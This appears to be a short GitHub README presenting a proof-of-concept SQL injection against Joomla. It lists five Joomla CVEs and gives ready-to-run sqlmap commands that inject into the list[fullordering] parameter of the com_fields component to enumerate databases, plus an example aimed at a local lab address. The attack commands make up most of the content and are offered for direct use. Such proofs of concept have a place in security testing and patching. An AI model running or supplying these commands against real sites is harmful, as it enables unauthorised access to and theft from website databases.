# Joomla-SQLinjection PoC

1. CVE-2020-10243

2. CVE-2019-19846

3. CVE-2018-8045

4. CVE-2018-6376

5. CVE-2017-8917
## Detecting:
![image](https://user-images.githubusercontent.com/24661746/77416170-26e2c680-6df6-11ea-9923-07369d1e6620.png)
## Sqlmap:
sqlmap -u "[your taget]/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=*&your token" --dbms=mysql --technique=E --dbs
## Example
sqlmap -u "http://192.168.119.128/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=*&03286505451fb28982d4847525d6e00b" --dbms=mysql --technique=E --dbs

Reference:
1. https://github.com/HoangKien1020/CVE-2020-10243
2. https://xz.aliyun.com/t/6990
